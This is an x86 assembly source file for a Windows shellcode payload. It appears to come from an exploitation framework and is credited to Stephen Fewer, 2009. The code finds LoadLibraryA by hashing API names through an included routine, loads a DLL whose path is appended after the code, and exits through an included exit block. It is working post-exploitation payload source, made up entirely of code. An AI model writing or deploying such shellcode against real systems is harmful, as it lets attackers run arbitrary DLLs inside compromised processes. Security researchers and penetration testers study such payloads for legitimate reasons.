;-----------------------------------------------------------------------------;
; Author: Stephen Fewer (stephen_fewer[at]harmonysecurity[dot]com)
; Compatible: Windows 7, 2008, Vista, 2003, XP, 2000, NT4
; Version: 1.0 (28 July 2009)
; Size: 189 bytes + strlen(libpath) + 1
; Build: >build.py single_loadlibrary
;-----------------------------------------------------------------------------;

[BITS 32]
[ORG 0]

  cld                    ; Clear the direction flag.
  call start             ; Call start, this pushes the address of 'api_call' onto the stack.
delta:                   ;
%include "./src/block/block_api.asm" ; 
start:                   ;
  pop ebp                ; Pop off the address of 'api_call' for calling later.
  lea eax, [ebp+libpath-delta]
  push eax               ;
  push 0x0726774C        ; hash( "kernel32.dll", "LoadLibraryA" )
  call ebp               ; LoadLibraryA( &libpath );
	; Finish up with the EXITFUNK.
%include "./src/block/block_exitfunk.asm"
libpath:
  ;db "funkystuff.dll", 0
